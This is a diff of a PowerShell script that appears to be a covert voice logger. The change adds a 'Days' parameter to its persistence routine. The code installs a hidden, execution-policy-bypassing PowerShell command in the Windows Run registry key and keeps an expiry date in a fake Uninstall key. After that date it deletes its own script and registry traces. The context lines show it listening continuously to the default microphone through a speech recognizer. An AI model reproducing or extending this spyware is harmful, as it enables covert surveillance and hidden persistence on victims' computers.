@@ -4,30 +4,32 @@ function Persist-Logger {
 		[parameter(Position=0,Mandatory=$True)]
 		[string]$name,
         [parameter(Mandatory=$True)]
-		[string]$Command 
+		[string]$Command,
+        [parameter(Mandatory=$False)]
+		[string]$Days = 0 
 	);
 
-    if($DaysRun -eq -1 -or $DaysRun -gt 0){
+    if($Days -eq -1 -or $Days -gt 0){
         if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
     
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $Command;
     
-        if($DaysRun -eq -1){ return };
+        if($Days -eq -1){ return };
         if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
     
-        $date = (Get-Date).AddDays($daysRun);
+        $date = (Get-Date).AddDays($Days);
         New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date" -Value $date;
     }
     
-    if($DaysRun -gt 0){
+    if($Days -gt 0){
         $date = Get-Date;
         $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date";
         $targetDate = [DateTime]$targetValue.date;
     
         if($date -lt $targetDate){ return }
     
-        Remove-Item "$env:temp\voicelog.ps1" -Force;
+        Remove-Item "$env:temp\$name.ps1" -Force;
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
     }
@@ -57,7 +59,7 @@ $recognizer.LoadGrammar($grammar);
 $recognizer.SetInputToDefaultAudioDevice();
 
 $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
-Persist-Logger "voicelog" -Command $autostart;
+Persist-Logger "voicelog" -Command $autostart -Days $DaysRun;
 
 while ($true) {
     $result = $recognizer.Recognize();
